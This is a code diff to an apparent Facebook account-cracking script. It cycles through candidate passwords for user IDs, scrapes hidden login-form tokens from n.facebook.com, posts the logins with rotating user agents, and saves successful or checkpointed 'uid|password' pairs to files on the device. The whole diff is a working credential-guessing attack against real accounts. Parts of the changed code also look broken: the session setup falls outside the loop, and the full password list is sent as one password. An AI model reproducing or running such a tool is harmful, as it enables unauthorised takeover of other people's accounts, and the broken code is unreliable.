@@ -1054,53 +1054,57 @@ cps = []
 
 # API
 def gxds_files(uid, pxss):
+    url = "https://n.facebook.com"
+    xurl = url + "/login.php"
     global oks, loop, cps
     sys.stdout.write(f"\r  \033[1;30m[GOXDIES] {loop} | {str(len(oks))}")
     sys.stdout.flush()
-    session=requests.Session()
     try:
         for ps in pxss:
             qwerty = random.choice(gxdsUArndm)
-            gxdsfbs = session.get("https://n.facebook.com").text
-            dxta = {
-                "lsd": re.search('name="lsd" value="(.*?)"', str(gxdsfbs)).group(1),
-                "jazoest": re.search(
-                    'name="jazoest" value="(.*?)"', str(gxdsfbs)
-                ).group(1),
-                "m_ts": re.search('name="m_ts" value="(.*?)"', str(gxdsfbs)).group(1),
-                "li": re.search('name="li" value="(.*?)"', str(gxdsfbs)).group(1),
-                "try_number": "0",
-                "unrecognized_tries": "0",
-                "email": uid,
-                "pass": ps,
-                "login": "Log In",
-            }
-            headxr = {
-                "authority": "https://n.facebook.com",
-                "method": "POST",
-                "scheme": "https",
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'dpr': '1.7000000476837158',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5745.209", "Google Chrome";v="116.0.5745.209"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
+            req = requests.Session()
+        req.headers.update(
+            {
+                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                "accept-language": "en_US",
+                "cache-control": "max-age=0",
+                "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-platform": "Windows",
+                "sec-fetch-dest": "document",
+                "sec-fetch-mode": "navigate",
+                "sec-fetch-site": "same-origin",
+                "sec-fetch-user": "?1",
+                "upgrade-insecure-requests": "1",
                 "user-agent": qwerty,
             }
-            session.post(
-                url="https://n.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
-                data=dxta,
-                headers=headxr,
-            ).text
+        )
+        with req.get(url) as response_body:
+            inspect = bs(response_body.text, "html.parser")
+            lsd_key = inspect.find("input", {"name": "lsd"})["value"]
+            jazoest_key = inspect.find("input", {"name": "jazoest"})["value"]
+            m_ts_key = inspect.find("input", {"name": "m_ts"})["value"]
+            li_key = inspect.find("input", {"name": "li"})["value"]
+            try_number_key = inspect.find("input", {"name": "try_number"})["value"]
+            unrecognized_tries_key = inspect.find(
+                "input", {"name": "unrecognized_tries"}
+            )["value"]
+            bi_xrwh_key = inspect.find("input", {"name": "bi_xrwh"})["value"]
+            data = {
+                "lsd": lsd_key,
+                "jazoest": jazoest_key,
+                "m_ts": m_ts_key,
+                "li": li_key,
+                "try_number": try_number_key,
+                "unrecognized_tries": unrecognized_tries_key,
+                "bi_xrwh": bi_xrwh_key,
+                "email": uid,
+                "pass": pxss,
+                "login": "submit",
+            }
+            response_body2 = req.post(
+                xurl, data=data, allow_redirects=True, timeout=300
+            )
             lxgin = (
                 str(req.cookies.get_dict())[1:-1]
                 .replace("'", "")
@@ -1108,17 +1112,17 @@ def gxds_files(uid, pxss):
                 .replace(":", "=")
             )
             if "c_user" in lxgin:
-                print('\r\r\033[1;32m  [GXDS-✓] '+uid+':'+ps+' - '+yxxr(uid))
+                print("\r\r\033[1;32m  [GXDS-✓] " + uid + ":" + ps + " - " + yxxr(uid))
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 oks.append(uid)
                 break
             elif "checkpoint" in lxgin:
-                print('\r\r\033[1;31m  [GXDS-X] '+uid+':'+ps+' - '+yxxr(uid))
+                print("\r\r\033[1;31m  [GXDS-X] " + uid + ":" + ps + " - " + yxxr(uid))
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                 cps.append(uid)
                 break
             else:
-                print('\r\r\033[1;31m  [GXDS-X] '+uid+':'+ps+' - '+yxxr(uid))
+                print("\r\r\033[1;31m  [GXDS-X] " + uid + ":" + ps + " - " + yxxr(uid))
                 continue
         loop += 1
     except requests.exceptions.ConnectionError:
